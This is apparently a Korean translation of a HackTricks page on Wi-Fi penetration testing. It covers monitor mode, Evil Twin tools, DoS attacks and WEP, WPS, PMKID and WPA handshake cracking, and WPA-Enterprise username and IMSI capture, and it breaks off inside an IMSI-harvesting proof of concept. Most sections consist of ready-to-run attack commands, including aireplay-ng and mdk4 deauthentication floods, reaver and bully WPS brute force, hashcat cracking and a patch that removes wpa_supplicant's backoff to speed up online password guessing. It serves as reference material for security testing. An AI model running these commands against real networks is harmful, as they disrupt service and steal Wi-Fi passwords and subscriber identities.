# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi 기본 명령
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## 도구

### Hijacker & NexMon (Android 내장 Wi-Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**docker로 airgeddon 실행하기**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
출처: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

해당 도구는 Evil Twin, KARMA, Known Beacons 공격을 수행한 후 phishing template을 이용해 network real password를 획득하거나 social network credentials를 캡처할 수 있습니다.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

이 도구는 **WPS/WEP/WPA-PSK** 공격을 자동화합니다. 자동으로 다음을 수행합니다:

- 인터페이스를 monitor mode로 설정
- 가능한 네트워크를 스캔하고 피해자(들)를 선택하도록 함
- WEP인 경우 - WEP 공격 실행
- WPA-PSK인 경우
- WPS인 경우: Pixie dust attack 및 bruteforce attack 실행(주의: brute-force attack은 매우 오래 걸릴 수 있음). null PIN이나 database/generated PINs는 시도하지 않음.
- AP에서 PMKID를 캡처하여 크랙을 시도함
- AP의 클라이언트들을 deauthenticate하여 handshake를 캡처하려 시도함
- PMKID 또는 Handshake가 있으면 top5000 passwords를 사용해 bruteforce 시도

## 공격 요약

- **DoS**
- Deauthentication/disassociation -- 모두 연결 끊기(또는 특정 ESSID/Client)
- Random fake APs -- 네트워크 숨김, 스캐너 충돌 가능
- Overload AP -- AP를 중단시키려 시도(보통 크게 유용하지 않음)
- WIDS -- IDS를 조작
- TKIP, EAPOL -- 특정 AP들에 대해 DoS를 유발하는 일부 특정 공격
- **Cracking**
- Crack **WEP** (여러 도구와 방법)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- captive portal creds를 캡처하거나 LAN 공격을 수행하는 데 유용
- **WPA-PSK** Evil Twin -- 비밀번호를 알고 있다면 네트워크 공격에 유용
- **WPA-MGT** -- company credentials를 캡처하는 데 유용
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- captive portal creds를 캡처하거나 LAN 공격 수행에 유용
- **+ WPA** -- WPA handshakes를 캡처하는 데 유용

## Open / OWE 네트워크 빠른 메모

- **Passive capture** on open SSIDs는 monitor mode와 tcpdump로 여전히 작동함:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption)는 스테이션별 키 교환을 수행하므로(PSK 없음) "open" SSID에서도 무선 프레임이 암호화됩니다. WPA3 기반이므로 스푸핑된 deauth/disassoc 프레임을 차단하는 **802.11w PMF**도 적용됩니다.
- OWE는 **가입자 인증을 수행하지 않습니다**: 누구나 association할 수 있으므로 마케팅 문구를 믿지 말고 **client isolation**을 확인하세요. 격리가 없으면 ARP spoofing이나 responder-style poisoning 같은 로컬 L2 공격이 여전히 작동합니다.
- **Evil Twin**은 더 강한 신호를 내세워 open/OWE SSID에서 여전히 가능하며; PMF는 단지 deauth 지름길을 제거합니다. 피해자가 위조된 TLS cert를 수락하면 완전한 HTTP(S) MitM이 다시 성립됩니다.
- 공개 게스트 Wi‑Fi에서의 브로드캐스트 포이즈닝은 creds/hashes(LLMNR/NBT-NS/mDNS)를 쉽게 얻을 수 있습니다. 참조:

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Deauthentication Packets

**설명 출처** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** 공격은 Wi‑Fi 해킹에서 널리 사용되는 방법으로, "management" 프레임을 위조하여 장치를 네트워크에서 **강제로 분리**시킵니다. 이러한 암호화되지 않은 패킷은 클라이언트가 정당한 네트워크로부터 온 것으로 착각하게 만들어, 공격자가 크래킹을 위해 WPA handshakes를 수집하거나 네트워크 연결을 지속적으로 방해할 수 있게 합니다. 이 전술은 단순함 때문에 더욱 우려스럽고, 널리 사용되며 네트워크 보안에 중대한 영향을 미칩니다.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0는 deauthentication을 의미합니다
- 1은 보낼 deauths의 수입니다 (원하면 여러 개 보낼 수 있음); 0은 계속 전송함을 의미합니다
- -a 00:14:6C:7E:40:80는 access point의 MAC address입니다
- -c 00:0F:B5:34:30:30는 deauthenticate할 client의 MAC address입니다; 이 옵션을 생략하면 broadcast deauthentication이 전송됩니다(항상 작동하지 않을 수 있음)
- ath0는 인터페이스 이름입니다

### Disassociation Packets

**Disassociation packets**, similar to deauthentication packets, are a type of management frame used in Wi-Fi networks. 이러한 패킷은 장치(예: 노트북 또는 스마트폰)와 access point(AP) 간의 연결을 끊는 역할을 합니다. Disassociation와 deauthentication의 주요 차이는 사용 시나리오에 있습니다. AP가 **deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown**, 재시작 또는 이동 중일 때 전송되어 연결된 모든 노드의 연결을 해제해야 할 때 사용됩니다.

**이 공격은 mdk4(mode "d")로 수행할 수 있습니다:**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **mdk4의 추가 DOS 공격**

**자세한 내용은** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

클라이언트에 fake APs를 표시하기 위해 beacon frames를 보냅니다. 이것은 때때로 network scanners나 심지어 drivers를 충돌시킬 수 있습니다!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

범위 내에서 접근 가능한 모든 Access Points (APs)에 authentication frames를 전송하면, 특히 많은 clients가 관련된 경우 해당 APs에 과부하를 일으킬 수 있습니다. 이러한 과도한 트래픽은 시스템 불안정을 초래하여 일부 APs가 멈추거나 심지어 리셋될 수 있습니다.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs)는 SSID가 제대로 드러나는지 확인하고 AP의 전파 범위를 확인합니다. 이 기술은 wordlist 유무와 관계없이 **bruteforcing hidden SSIDs**와 결합되어 숨겨진 네트워크를 식별하고 접근하는 데 도움이 됩니다.

**ATTACK MODE m: Michael Countermeasures Exploitation**

무작위 또는 중복 패킷을 서로 다른 QoS queues로 전송하면 **TKIP APs**에서 Michael Countermeasures를 유발하여 AP가 1분간 셧다운될 수 있습니다. 이 방법은 효율적인 **DoS** (Denial of Service) 공격 전술입니다.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

AP에 **EAPOL Start frames**를 대량으로 전송하면 **fake sessions**가 생성되어 AP가 과부하되고 정상적인 클라이언트 접속이 차단됩니다. 또는 **fake EAPOL Logoff messages**를 주입하면 클라이언트를 강제로 연결 해제할 수 있으며, 두 방법 모두 네트워크 서비스를 효과적으로 방해합니다.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: IEEE 802.11s 메시 네트워크에 대한 공격**

메시 네트워크에서의 링크 관리 및 라우팅에 대한 다양한 공격.

**ATTACK MODE w: WIDS 혼란**

클라이언트를 여러 WDS 노드나 가짜 rogue APs에 교차 연결하면 Intrusion Detection and Prevention Systems를 조작하여 혼란과 잠재적 시스템 남용을 초래할 수 있다.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

다양한 패킷 소스와 패킷 조작을 위한 포괄적인 수정자 세트를 갖춘 packet fuzzer입니다.

### **Airggedon**

_**Airgeddon**_는 이전 항목에서 제안한 대부분의 공격을 제공합니다:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup)는 라우터에 장치를 연결하는 과정을 단순화하여 **WPA** 또는 **WPA2** Personal로 암호화된 네트워크의 설정 속도와 편의성을 향상시킵니다. 쉽게 뚫리는 **WEP** 보안에는 효과적이지 않습니다. WPS는 8자리 PIN을 사용하며, 두 부분으로 검증되기 때문에 조합 수가 제한되어(약 11,000가지) 무차별 대입 공격에 취약합니다.

### WPS Bruteforce

이를 수행하는 주요 도구는 2가지입니다: Reaver와 Bully.

- **Reaver**는 WPS에 대한 견고하고 실용적인 공격으로 설계되었으며, 다양한 액세스 포인트와 WPS 구현을 대상으로 테스트되었습니다.
- **Bully**는 C로 작성된 WPS brute force 공격의 **새로운 구현**입니다. 원래 Reaver 코드에 비해 몇 가지 장점이 있습니다: 의존성 감소, 향상된 메모리 및 CPU 성능, 올바른 엔디안 처리, 그리고 더 견고한 옵션 세트.

이 공격은 **WPS PIN's vulnerability**를 악용하며, 특히 처음 네 자리의 노출과 마지막 자리의 체크섬 역할 때문에 brute-force 공격이 쉬워집니다. 그러나 공격적인 행위를 하는 공격자의 **blocking MAC addresses**와 같은 무차별 대입 방어가 있을 경우, 공격을 계속하려면 **MAC address rotation**이 필요합니다.

Bully나 Reaver와 같은 도구로 WPS PIN을 얻으면 공격자는 WPA/WPA2 PSK를 유추할 수 있어 **지속적인 네트워크 접근**을 확보할 수 있습니다.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

이 정교한 접근법은 알려진 취약점을 이용해 WPS PINs를 공략합니다:

1. **사전 발견된 PINs**: 일관된 WPS PINs를 사용하는 것으로 알려진 특정 제조사와 연관된 알려진 PINs 데이터베이스를 활용합니다. 이 데이터베이스는 MAC-addresses의 처음 세 octets과 해당 제조사에 대해 가능성이 높은 PINs를 연관시킵니다.
2. **PIN 생성 알고리즘**: ComputePIN 및 EasyBox와 같은 알고리즘을 활용하여 AP의 MAC-address를 기반으로 WPS PINs를 계산합니다. Arcadyan 알고리즘은 추가로 device ID가 필요해 PIN 생성 과정에 한 층을 더합니다.

### WPS Pixie Dust attack

**Dominique Bongard**은 일부 Access Points (APs)에서 비밀 코드인 **nonces**(**E-S1** 및 **E-S2**) 생성과 관련한 결함을 발견했습니다. 이 nonces를 알아낼 수 있다면 AP의 WPS PIN을 깨는 것은 쉬워집니다. AP는 PIN을 특별한 코드 (hash) 안에 포함시켜 정당한 장치이며 가짜 (rogue) AP가 아님을 증명합니다. 이 nonces는 본질적으로 WPS PIN을 담고 있는 "금고"를 여는 "열쇠"입니다. 자세한 내용은 [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)에서 확인할 수 있습니다.

간단히 말하면, 문제는 일부 APs가 연결 과정에서 PIN을 암호화할 때 충분히 랜덤한 키를 사용하지 않았다는 것입니다. 이로 인해 PIN은 네트워크 외부에서 추측될 수 있어 (offline brute force attack)에 취약해집니다.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
디바이스를 monitor mode로 전환하기 싫거나 `reaver`와 `bully`에 문제가 있을 경우, [OneShot-C](https://github.com/nikita-yfh/OneShot-C)를 시도해 볼 수 있습니다. 이 도구는 monitor mode로 전환하지 않고도 Pixie Dust attack을 수행할 수 있습니다.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

설계가 부실한 일부 시스템은 **Null PIN**(빈 PIN 또는 존재하지 않는 PIN)으로도 접근을 허용하는 경우가 있어, 이는 매우 이례적입니다.  
도구 **Reaver**는 이 취약점을 테스트할 수 있지만 **Bully**는 그렇지 않습니다.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

All the proposed WPS attacks can be easily performed using _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 and 6 lets you try **사용자 지정 PIN** (있는 경우)
- 7 and 8 perform the **Pixie Dust attack**
- 13 allows you to test the **NULL PIN**
- 11 and 12 will **사용 가능한 데이터베이스에서 선택한 AP와 관련된 PIN들을 재수집**하고 **가능한 PIN들을 생성**하기 위해 ComputePIN, EasyBox 및 선택적으로 Arcadyan(권장, 왜 안 해?)을 사용한다
- 9 and 10 will test **모든 가능한 PIN**

## **WEP**

**왜 무너지는가**

- RC4 seed는 단지 **IV (24 bits) + shared key**이다. IV는 cleartext이고, 작다(2^24), 그리고 빠르게 반복되므로 동일한 IV를 가진 ciphertexts는 keystream을 재사용한다.
- XORing 두 ciphertexts가 동일한 keystream을 가질 경우 `PlaintextA ⊕ PlaintextB` leaks; 예측 가능한 headers + RC4 KSA biases (**FMS**)는 키 바이트에 대해 “vote”하게 해준다. **PTW**는 ARP traffic을 사용해 이를 최적화하여 필요한 패킷 수를 수백만에서 수만으로 줄인다.
- 무결성은 단지 **CRC32**(선형/무키)뿐이므로, 공격자는 키 없이 비트를 뒤집고 CRC32를 다시 계산할 수 있다 → IV를 기다리는 동안 packet forgery/replay/ARP injection이 가능하다.

Practical break is deterministic:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon은 여전히 안내형 UI를 선호한다면 "All-in-One" WEP 워크플로를 제공합니다.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

In 2018, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) a new attack method, unique because it only needs **one single packet** and doesn't require any clients to be connected to the target AP—just interaction between the attacker and the AP.

많은 최신 라우터는 연결(association) 중 **첫 번째 EAPOL** 프레임에 `Robust Security Network`로 알려진 **선택적 필드**를 추가합니다. 이 필드에는 `PMKID`가 포함됩니다.

As the original post explains, the **PMKID** is created using known data:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
"PMK Name"이 고정되어 있고, AP의 BSSID와 station을 알고 있으며 `PMK`가 전체 4-way handshake의 것과 동일하므로, **hashcat**은 이 정보를 사용해 PSK를 크랙하고 passphrase를 복구할 수 있습니다!

이 정보를 **gather**하고 비밀번호를 로컬에서 **bruteforce**하기 위해 다음을 수행할 수 있습니다:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**PMKIDs captured**는 **console**에 표시되며 또한 \_ **/tmp/attack.pcap**\_\.\
이제 capture를 **hashcat/john** format으로 변환하고 crack하세요:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
올바른 해시 형식은 총 **4부분**으로 구성됩니다, 예: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` 만약 당신의 것이 **오직** **3부분**만 포함한다면, 그것은 **유효하지 않습니다** (PMKID 캡처가 유효하지 않았습니다).

참고로 `hcxdumptool`은 **handshakes도 캡처합니다** (다음과 같은 항목이 나타납니다: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). `cap2hccapx`를 사용하면 **handshakes**를 **hashcat**/**john** 포맷으로 **변환**할 수 있습니다.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_이 도구로 캡처한 일부 handshakes는 올바른 password를 알고 있음에도 불구하고 cracked되지 않는 것을 확인했습니다. 가능하다면 전통적인 방식으로도 handshakes를 캡처하거나, 이 도구로 여러 건을 캡처할 것을 권장합니다._

### Handshake 캡처

**WPA/WPA2** 네트워크에 대한 공격은 **handshake**를 캡처하고 암호를 **offline**에서 **crack** 시도함으로써 수행할 수 있습니다. 이 과정은 특정 네트워크의 통신과 특정 **channel**의 **BSSID**를 모니터링하는 것을 포함합니다. 간단한 가이드는 다음과 같습니다:

1. 대상 네트워크의 **BSSID**, **channel**, 및 **connected client**를 확인합니다.
2. 지정된 채널과 BSSID에서 네트워크 트래픽을 모니터링하여 handshake를 캡처하려면 `airodump-ng`를 사용하세요. 명령은 다음과 같이 보입니다:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. handshake를 캡처할 가능성을 높이려면 클라이언트를 네트워크에서 잠시 끊어 재인증을 강제하세요. 이는 클라이언트에 deauthentication packets를 전송하는 `aireplay-ng` 명령으로 수행할 수 있습니다:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_client가 deauthenticated된 경우 다른 AP나, 경우에 따라 다른 network에 연결을 시도할 수 있다는 점을 유의하세요._

`airodump-ng`에 handshake 정보가 표시되면 handshake가 캡처되었음을 의미하므로 listening을 중단해도 됩니다:

![](<../../images/image (172) (1).png>)

handshake가 캡처되면 `aircrack-ng`로 **crack**할 수 있습니다:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### 파일에 handshake가 있는지 확인

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_이 도구가 완료된 handshake보다 먼저 ESSID의 미완료 handshake를 찾으면, 유효한 것을 감지하지 못합니다._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### `wpa_supplicant` ctrl socket를 통한 더 빠른 온라인 PSK 추측 (클라이언트 없음/PMKID)

클라이언트가 없고 AP가 PMKID를 거부할 경우, supplicants를 재시작하지 않고도 온라인에서 PSK를 반복 시도할 수 있습니다:

- `wpa_supplicant.c`를 패치하여 auth failure backoff 로직(around `ssid->auth_failures`)에서 `dur = 0;`을 강제 설정하면 temporary-disable 타이머가 사실상 비활성화됩니다.
- 하나의 daemon을 control socket과 함께 실행:
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- 제어 인터페이스를 통해 구동하되, 동일한 scan 및 network를 재사용:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
A small Python loop reading socket events (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`) can test ~100 guesses in ~5 minutes without scan overhead. It is still noisy and detectable, but avoids per-attempt process restarts and backoff delays.

## **WPA Enterprise (MGT)**

In **엔터프라이즈 WiFi 설정에서는 다양한 인증 방식들을 만나게 되며**, 각 방식은 서로 다른 보안 수준과 관리 기능을 제공한다. `airodump-ng` 같은 도구로 네트워크 트래픽을 조사할 때 이러한 인증 타입을 나타내는 식별자를 볼 수 있다. 일반적인 방법들은 다음과 같다:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- 이 방법은 EAP-PEAP 내에서 하드웨어 토큰과 일회성 비밀번호를 지원합니다. MSCHAPv2와는 달리 peer challenge를 사용하지 않으며 비밀번호를 액세스 포인트에 평문으로 전송하므로 downgrade 공격의 위험이 있습니다.
2. **EAP-MD5 (Message Digest 5)**:
- 클라이언트가 비밀번호의 MD5 해시를 전송하는 방식입니다. 사전 공격에 취약하고 서버 인증이 없으며 세션별 WEP 키를 생성할 수 없기 때문에 **권장되지 않습니다**.
3. **EAP-TLS (Transport Layer Security)**:
- 클라이언트 측 및 서버 측 인증서를 모두 사용하여 인증하며 통신 보안을 위해 사용자 기반 및 세션 기반 WEP 키를 동적으로 생성할 수 있습니다.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- 암호화된 터널을 통해 상호 인증을 제공하며, 사용자별·세션별 동적 WEP 키를 도출하는 방법을 제공합니다. 서버 측 인증서만 필요하고 클라이언트는 자격 증명을 사용합니다.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- 보호된 통신을 위해 TLS 터널을 생성한다는 점에서 EAP와 유사하게 동작합니다. 터널이 제공하는 보호 덕분에 EAP 위에 약한 인증 프로토콜을 사용할 수 있게 합니다.
- **PEAP-MSCHAPv2**: 흔히 PEAP라고 불리며, 취약한 MSCHAPv2 challenge/response 메커니즘을 보호용 TLS 터널과 결합합니다.
- **PEAP-EAP-TLS (or PEAP-TLS)**: EAP-TLS와 유사하지만 인증서 교환 전에 TLS 터널을 먼저 시작하여 추가적인 보안 계층을 제공합니다.

이 인증 방법들에 대한 자세한 정보는 [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html)에서 확인할 수 있습니다.

### Username Capture

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) it looks like if you are using **EAP** the **"Identity"** **messages** must be **supported**, and the **username** is going to be sent in **clear** in the **"Response Identity"** messages.

가장 보안이 높은 인증 방법 중 하나인 **PEAP-EAP-TLS**를 사용하더라도 **EAP 프로토콜에서 전송되는 username을 캡처할 수 있습니다**. 이를 수행하려면 **인증 통신을 캡처**하십시오 (`airodump-ng`를 채널 내부에서 실행하고 동일한 인터페이스에서 `wireshark`를 실행한 후 패킷을 `eapol`로 필터링).\
"**Response, Identity**" 패킷 내부에서 클라이언트의 **사용자 이름**이 나타납니다.

![](<../../images/image (850).png>)

### Anonymous Identities

Identity 숨기기는 EAP-PEAP와 EAP-TTLS 모두에서 지원됩니다. WiFi 네트워크 맥락에서 EAP-Identity 요청은 일반적으로 association 과정 중에 액세스 포인트(AP)에 의해 시작됩니다. 사용자 익명성을 보호하기 위해, 사용자의 장치에 있는 EAP 클라이언트가 보내는 응답은 초기 RADIUS 서버가 요청을 처리하는 데 필요한 필수 정보만을 포함합니다. 이 개념은 다음 시나리오들로 설명할 수 있습니다:

- EAP-Identity = anonymous
- 이 시나리오에서는 모든 사용자가 가명 "anonymous"를 사용자 식별자로 사용합니다. 초기 RADIUS 서버는 EAP-PEAP 또는 EAP-TTLS 서버로 동작하며 PEAP 또는 TTLS 프로토콜의 서버 측을 관리합니다. 내부(보호된) 인증 방법은 로컬에서 처리되거나 원격(home) RADIUS 서버에 위임될 수 있습니다.
- EAP-Identity = anonymous@realm_x
- 이 경우 서로 다른 realm의 사용자들이 자신의 신원은 숨기면서 소속 realm을 나타냅니다. 이를 통해 초기 RADIUS 서버는 EAP-PEAP 또는 EAP-TTLS 요청을 해당 사용자의 홈 realm에 있는 RADIUS 서버로 프록시할 수 있으며, 그 서버들이 PEAP 또는 TTLS 서버로 동작합니다. 초기 RADIUS 서버는 단지 RADIUS 중계 노드로 동작합니다.
- 또는 초기 RADIUS 서버가 EAP-PEAP 또는 EAP-TTLS 서버로 동작하면서 보호된 인증 방법을 처리하거나 다른 서버로 전달할 수 있습니다. 이 옵션은 다양한 realm에 대해 서로 다른 정책을 구성할 수 있게 합니다.

EAP-PEAP에서는 PEAP 서버와 PEAP 클라이언트 사이에 TLS 터널이 설정된 후, PEAP 서버가 EAP-Identity 요청을 시작하고 이를 TLS 터널을 통해 전송합니다. 클라이언트는 이 두 번째 EAP-Identity 요청에 대해 암호화된 터널을 통해 사용자의 실제 신원을 포함한 EAP-Identity 응답을 보냅니다. 이 접근 방식은 802.11 트래픽을 도청하는 누군가에게 사용자의 실제 신원이 드러나는 것을 효과적으로 방지합니다.

EAP-TTLS는 약간 다른 절차를 따릅니다. EAP-TTLS에서는 일반적으로 클라이언트가 TLS 터널로 보호된 상태에서 PAP 또는 CHAP을 사용하여 인증합니다. 이 경우 클라이언트는 터널 설정 후 초기 TLS 메시지에 User-Name 속성과 Password 또는 CHAP-Password 속성 중 하나를 포함합니다.

선택한 프로토콜에 관계없이 PEAP/TTLS 서버는 TLS 터널이 설정된 후 사용자의 실제 신원을 알게 됩니다. 실제 신원은 user@realm 또는 단순히 user로 표현될 수 있습니다. PEAP/TTLS 서버가 사용자 인증도 담당하는 경우, 이제 서버는 사용자의 신원을 확보하고 TLS 터널로 보호된 인증 방법을 진행합니다. 또는 PEAP/TTLS 서버가 새로운 RADIUS 요청을 사용자의 홈 RADIUS 서버로 전달할 수 있습니다. 이 새로운 RADIUS 요청에는 PEAP 또는 TTLS 프로토콜 레이어가 포함되지 않습니다. 보호된 인증 방법이 EAP인 경우 내부 EAP 메시지는 EAP-PEAP 또는 EAP-TTLS 래퍼 없이 홈 RADIUS 서버로 전송됩니다. 나가는 RADIUS 메시지의 User-Name 속성은 들어오는 RADIUS 요청의 anonymous User-Name을 대체하여 사용자의 실제 신원을 포함합니다. 보호된 인증 방법이 PAP 또는 CHAP인 경우(이는 TTLS에서만 지원됨), TLS 페이로드에서 추출된 User-Name 및 기타 인증 속성들이 나가는 RADIUS 메시지에 대체되어 들어오는 RADIUS 요청에 있는 anonymous User-Name 및 TTLS EAP-Message 속성을 대체합니다.

자세한 내용은 [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm) 을 확인하세요.

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM 기반 Wi‑Fi 인증(EAP‑SIM/EAP‑AKA over 802.1X)은 pseudonyms/protected identities를 구현하지 않거나 내부 EAP 주위에 TLS 터널을 적용하지 않은 배포의 경우, 인증되지 않은 identity 단계에서 영구 가입자 식별자(IMSI)를 평문으로 leak할 수 있습니다.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>확장하려면 클릭</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
